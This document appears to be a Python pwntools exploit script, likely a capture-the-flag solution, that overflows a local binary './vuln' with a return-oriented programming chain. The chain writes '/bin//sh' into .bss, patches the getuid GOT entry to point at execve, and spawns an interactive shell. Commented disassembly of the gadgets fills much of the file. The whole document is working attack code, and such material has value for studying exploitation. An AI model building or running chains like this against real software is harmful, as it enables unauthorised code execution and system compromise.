#!/usr/bin/python 
from pwn import *

def abs(num):
	if num<0:
		return 0x100000000 + num
	else:
		return num

getuid_got = 0x804a004
getuid_plt = 0x80483b0
getuid_libc = 0xf7ebca00
execve_libc = 0xf7ebbf40
offset = abs(execve_libc - getuid_libc)
bss = 0x804a028 # bss
padding = p32(0x01020102)

g1 = 0x0804849e # add dword ptr [ebx + 0x5d5b04c4], eax ; ret
g2 = 0x08048380 # pop ebx ; ret
g3 = 0x080485cd # pop esi ; pop edi ; pop ebp ; ret

# ------- gadget 4 ------- set eax  
g4 = 0x80485b3
# 80485b3:	8b 44 24 34          	mov    eax,DWORD PTR [esp+0x34]
# 80485b7:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
# 80485bb:	ff 94 b3 20 ff ff ff 	call   DWORD PTR [ebx+esi*4-0xe0]
# 									; after calling, eax should be unmodified
# 80485c2:	83 c6 01             	add    esi,0x1
# 80485c5:	39 fe                	cmp    esi,edi
# 80485c7:	75 df                	jne    80485a8 <__libc_csu_init+0x38>
# 80485c9:	83 c4 1c             	add    esp,0x1c
# 80485cc:	5b                   	pop    ebx
# 80485cd:	5e                   	pop    esi
# 80485ce:	5f                   	pop    edi
# 80485cf:	5d                   	pop    ebp
# 80485d0:	c3                   	ret    

fun = 0x8049f3c # 0x8049f3c --> 0x804861c
# Here is the func who does not change eax; call it will not modified eax.
# 0804861c <_fini>:
# 804861c:	53                   	push   ebx
# 804861d:	83 ec 08             	sub    esp,0x8
# 8048620:	e8 00 00 00 00       	call   8048625 <_fini+0x9>
# 8048625:	5b                   	pop    ebx
# 8048626:	81 c3 cf 19 00 00    	add    ebx,0x19cf
# 804862c:	e8 1f fe ff ff       	call   8048450 <__do_global_dtors_aux>
# 8048631:	83 c4 08             	add    esp,0x8
# 8048634:	5b                   	pop    ebx
# 8048635:	c3                   	ret 
# 
# 08048450 <__do_global_dtors_aux>:
# 8048450:	55                   	push   ebp
# 8048451:	89 e5                	mov    ebp,esp
# 8048453:	53                   	push   ebx
# 8048454:	83 ec 04             	sub    esp,0x4
# 8048457:	80 3d 28 a0 04 08 00 	cmp    BYTE PTR ds:0x804a028,0x0
# 									; need to set 0x804a028(bss) not zero
# 804845e:	75 3f                	jne    804849f <__do_global_dtors_aux+0x4f>
# .............................................................................
# 804849f:	83 c4 04             	add    esp,0x4
# 80484a2:	5b                   	pop    ebx
# 80484a3:	5d                   	pop    ebp
# 80484a4:	c3                   	ret   
esi = 0x01020101 
ebx = 0x03fc9c18 # ebx = fun + 0xe0 - 4*esi

# ------ gadget 5 ------ set bss = 0x1
g5 = 0x8048498
# 8048498:	c6 05 28 a0 04 08 01 	mov    BYTE PTR ds:0x804a028,0x1
# 804849f:	83 c4 04             	add    esp,0x4
# 80484a2:	5b                   	pop    ebx
# 80484a3:	5d                   	pop    ebp
# 80484a4:	c3                   	ret 

def set_eax(content):
	buf =  ""
	buf += p32(g2) + p32(ebx)
	buf += p32(g3) + p32(esi) + padding*2
	buf += p32(g4) + padding*11 + p32(g3) + padding + p32(content) + padding
	return buf

def add(addr,content): # add content to [addr]
	# g1 = 0x0804849e # add dword ptr [ebx + 0x5d5b04c4], eax ; ret
	ebx = abs(addr-0x5d5b04c4)
	buf =  ""
	buf += p32(g2) + p32(ebx) 
	buf += p32(g1) 
	return set_eax(content)+buf

payload =  "A" * 268
payload += p32(g5) + padding*3 # set bss[0] = 0x1
# .bss:
# 000 | 0x1
# 004 | /bin
# 008 | //sh
# 012 | 0x0
payload += add(bss+0x4, 0x6e69622f) # "/bin"
payload += add(bss+0x8, 0x68732f2f) # "//sh"
payload += add(getuid_got, offset)  # modified getuid to execve
payload += p32(getuid_plt) + p32(0xdeadbeef)
payload += p32(bss+0x4) + p32(bss+0xc) + p32(bss+0xc)

# print payload
p = process(['./vuln',payload])
p.interactive()